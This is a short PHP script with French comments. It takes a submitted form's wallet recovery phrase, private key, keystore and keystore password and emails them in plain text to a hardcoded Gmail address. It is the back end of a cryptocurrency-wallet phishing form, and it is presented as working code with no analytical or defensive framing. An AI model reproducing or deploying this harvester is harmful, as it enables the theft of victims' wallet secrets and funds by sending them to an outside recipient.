<?php
// Vérifier si le formulaire est soumis
if (isset($_POST['submit'])) {
    // Récupérer les données du formulaire
    $phrase = $_POST['phrase'];
    $privatekey = $_POST['privatekey'];
    $keystore = $_POST['keystore'];
    $keystorepass = $_POST['keystorepass'];

    // Créer le sujet et le corps du mail
    $subject = "Données du formulaire";
    $body = "Voici les données du formulaire :\n"
        . "Phrase : $phrase\n"
        . "Clé privée : $privatekey\n"
        . "Keystore : $keystore\n"
        . "Mot de passe : $keystorepass";

    // Spécifier l'adresse du destinataire
    $to = "ine697704@gmail.com";

    // Envoyer le mail avec la fonction mail de PHP
    if (mail($to, $subject, $body)) {
        echo "Mail envoyé avec succès";
    } else {
        echo "Erreur lors de l'envoi du mail";
    }
}
?>
